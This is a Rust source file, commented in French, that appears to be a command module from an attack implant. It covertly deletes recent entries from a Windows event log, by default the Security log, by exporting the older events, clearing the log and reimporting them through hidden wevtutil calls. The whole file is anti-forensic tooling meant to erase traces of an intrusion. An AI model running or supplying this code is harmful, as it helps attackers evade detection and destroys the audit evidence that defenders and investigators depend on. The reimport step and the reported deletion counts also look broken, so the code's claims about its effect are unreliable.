// Retour arrière sélectif des journaux Windows (Event Log).
// Supprime les événements récents (par défaut les 5 dernières minutes)
// au lieu d'effacer le journal complet — plus discret, conforme au PDF.
pub fn run(args: &str) -> String {
    #[cfg(not(windows))]
    return "logroll disponible sur Windows uniquement".to_string();

    #[cfg(windows)]
    {
        let mut parts = args.splitn(2, ' ');
        let log = parts.next().unwrap_or("Security").trim();
        let minutes: u64 = parts
            .next()
            .and_then(|s| s.trim().parse().ok())
            .unwrap_or(5);
        run_windows(log, minutes)
    }
}

#[cfg(windows)]
fn run_windows(log: &str, minutes: u64) -> String {
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    // Lister les EventRecordID des N dernières minutes via wevtutil.
    let query = format!(
        "*[System[TimeCreated[timediff(@SystemTime) <= {}]]]",
        minutes * 60 * 1000
    );
    let list_out = Command::new("wevtutil")
        .args(["qe", log, "/q:query", &format!("/query:{}", query),
               "/f:text", "/rd:true"])
        .creation_flags(0x08000000)
        .output();

    let ids: Vec<String> = match &list_out {
        Ok(o) if o.status.success() => {
            let text = String::from_utf8_lossy(&o.stdout);
            text.lines()
                .filter_map(|line| {
                    let trimmed = line.trim();
                    if trimmed.starts_with("EventRecordID:") || trimmed.starts_with("Event[") {
                        trimmed.split(':').last().map(|s| s.trim().to_string())
                    } else {
                        None
                    }
                })
                .collect()
        }
        _ => vec![],
    };

    if ids.is_empty() {
        // Fallback : exporter les événements à garder, vider, réimporter.
        let keep_query = format!(
            "*[System[TimeCreated[timediff(@SystemTime) > {}]]]",
            minutes * 60 * 1000
        );
        let tmp = format!("{}\\Temp\\evt_{}.evtx", std::env::var("SYSTEMROOT").unwrap_or_else(|_| "C:\\Windows".into()), std::process::id());

        let export = Command::new("wevtutil")
            .args(["epl", log, &tmp, &format!("/q:{}", keep_query)])
            .creation_flags(0x08000000)
            .output();

        if export.map(|o| o.status.success()).unwrap_or(false) {
            let _ = Command::new("wevtutil")
                .args(["cl", log])
                .creation_flags(0x08000000)
                .output();
            let _ = Command::new("wevtutil")
                .args(["im", &tmp])
                .creation_flags(0x08000000)
                .output();
            let _ = std::fs::remove_file(&tmp);
            return format!("{} : événements des {} dernières minutes supprimés", log, minutes);
        }

        return format!("[erreur] {} : export des événements à conserver échoué", log);
    }

    // Exporter les événements à conserver, vider le log, puis réimporter.
    let keep_query = format!(
        "*[System[TimeCreated[timediff(@SystemTime) > {}]]]",
        minutes * 60 * 1000
    );
    let count = ids.len();
    let tmp = format!("{}\\Temp\\evt_{}.evtx", std::env::var("SYSTEMROOT").unwrap_or_else(|_| "C:\\Windows".into()), std::process::id());

    let export = Command::new("wevtutil")
        .args(["epl", log, &tmp, &format!("/q:{}", keep_query)])
        .creation_flags(0x08000000)
        .output();

    if export.map(|o| o.status.success()).unwrap_or(false) {
        let _ = Command::new("wevtutil")
            .args(["cl", log])
            .creation_flags(0x08000000)
            .output();
        let _ = Command::new("wevtutil")
            .args(["im", &tmp])
            .creation_flags(0x08000000)
            .output();
        let _ = std::fs::remove_file(&tmp);
    }

    format!("{} : {} événements supprimés (fenêtre de {} min)", log, count, minutes)
}
